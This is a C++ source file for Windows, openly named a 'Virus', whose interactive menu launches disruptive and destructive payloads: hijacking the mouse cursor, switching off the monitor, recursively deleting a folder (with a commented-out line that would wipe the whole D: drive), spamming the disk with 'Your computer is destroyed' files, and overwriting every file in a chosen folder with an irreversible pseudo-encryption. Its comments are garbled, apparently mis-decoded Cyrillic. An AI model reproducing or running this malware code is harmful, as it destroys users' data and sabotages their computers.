#include "virus.h"

namespace fs = std::filesystem;

Virus::Virus()
{
    //�������� ������ ������
    this->screen_height = GetSystemMetrics(SM_CXSCREEN);
    this->screen_width = GetSystemMetrics(SM_CYSCREEN);

    choice();
}

void Virus::music()
{
    //��������� ����������� ������
    std::string pathToMusic = "D:\\music.wav";
    
    if (FileExists(pathToMusic)) {
        ShellExecute(NULL, NULL, L"D:\\music.wav", NULL, NULL, SW_SHOWMAXIMIZED);

        //������� ������ � ����� �� ������ ��� ��� �� ���� ��������� �������� ������ �����
        for (int i = 0; i < 3000; ++i)
        {
            SetCursorPos(0, 0);
            Sleep(1);
        }
    }
    else
    {
        for (int i = 0; i < 75; ++i)
        {
            std::cout << '\a';
            SetCursorPos(0, 0);
            Sleep(150);
        }
    }
}

void Virus::choice()
{
    int choice;
    //�������� ���� ��������
    do {
        system("cls");

        //�������� ��� �� ������ ������ � �������
        std::cout << "how will we block the computer" << std::endl;
        menu();
        std::cin >> choice;
        if (choice < 0) choice = 0;

        //switch ��� ������ ������� ���������� ������
        switch (choice)
        {
        case 1:
            moveMouse(this->screen_height, this->screen_width, 1000);
            break;
        case 2:
            monitor_sleep();
            break;
        case 3:
            music();
            break;
        case 4:
            delete_file();
            break;
        case 5:
            file_creation_spam();
            break;
        case 6:
            std::cout << "Enter path to folder" << std::endl;
            std::cin >> path;
            encrypt_folder(path);
            break;
        default:
            break;
        }
    } while (choice);
}

//������� ���������� �����
//������������ ������ = ������_������ + ������_������
char Virus::encrypt(char data, char password)
{
    return data + password;
}



void Virus::delete_file()
{
    //��������� �� ���� � ����� temp �� ����� D
    std::uintmax_t n = fs::remove_all("D:\\temp");
    
    //���� ��������� ��� �����, �� ���������� ���� ���� ����� D
    //std::uintmax_t n = fs::remove_all("D:\\");

    //�������� ������� ��������� �����
    std::cout << "Deleted " << n << " files or directories\n";
    system("pause");
}

void Virus::monitor_sleep()
{
    //��������� ������
    SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
    Sleep(5000);
    //�������� ������
    SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1);
}

//������� ����� �� ����� � �����
void Virus::encrypt_folder(std::string path)
{
    //���� ���������� ���� � �����
    for (const auto& entry : fs::directory_iterator(path))
    {
        std::vector<char> text;
        std::cout << entry.path() << std::endl;

        std::ifstream fin;
        std::ofstream fout;
        fin.open(entry.path());
        char a;

        if (fin.is_open())
        {
            //� ���� ��������� �� ������ ������� � ����� � ���������
            //���� ���� ��������� � ������
            while (!fin.eof())
            {
                fin >> a;
                text.push_back(encrypt(a, a));
            }
            fin.close();
            fout.open(entry.path());
            //� ������� � ���� ����� ������������ ���������� ��� ���������� �������������� � ����
            for (std::vector<char>::const_iterator i = text.begin(); i != text.end(); ++i)
                fout << *i;
            fout.close();
        }
    }
    system("pause");
}


//������� ������� .��� �����
void Virus::file_creation_spam()
{
    long i = 0;
    const char* path = "C:\\Virus\\";
    std::string content = "Your computer is destroyed get a new one";
    _mkdir(path);
    //���� ������� true, �� ���������� ���� ���� �� ���������� ����
    while (/*true*/ i < 1000)
    {
        ++i;
        std::ofstream file;
        file.open(path + std::to_string(i) + ".txt", std::ios_base::out);
        file << content;
        file.close();
        std::cout << "File created " + std::to_string(i) + "\r\n";
    }

}

void Virus::menu()
{
    std::cout << "1. Wiggle cursor" << std::endl;
    std::cout << "2. Turn off the monitor" << std::endl;
    std::cout << "3. Music" << std::endl;
    std::cout << "4. Delete file" << std::endl;
    std::cout << "5. Fill up disk space" << std::endl;
    std::cout << "6. Encrypt folder" << std::endl;
    std::cout << "0. Exit" << std::endl;
}

void Virus::moveMouse(int x, int y, int count)
{
    int movex, movey;
    float angle = 0.0f;

    //������� ������ �� ����� ������
    SetCursorPos(x / 2, y / 2);

    //������ ������, ���������� ��������� ����� �����
    //�� ���� ��������� ���� ������ ������������ �� ������
    //������ �� �����
    for (int i = 0; i <= count; i++) {
        angle = .3 * i;
        movex = (angle * cos(angle) * 2) + x / 2;
        movey = (angle * sin(angle) * 2) + y / 2;
        SetCursorPos(movex, movey);
        Sleep(1);
    }
}

//������� �������� �� ���� ����
//������� ����� ������ ���� �� �����
bool Virus::FileExists(std::string fname)
{
    std::ifstream fin;
    fin.open(fname);
    if (fin.is_open()) {
        fin.close();
        return true;
    }
    return false;
}
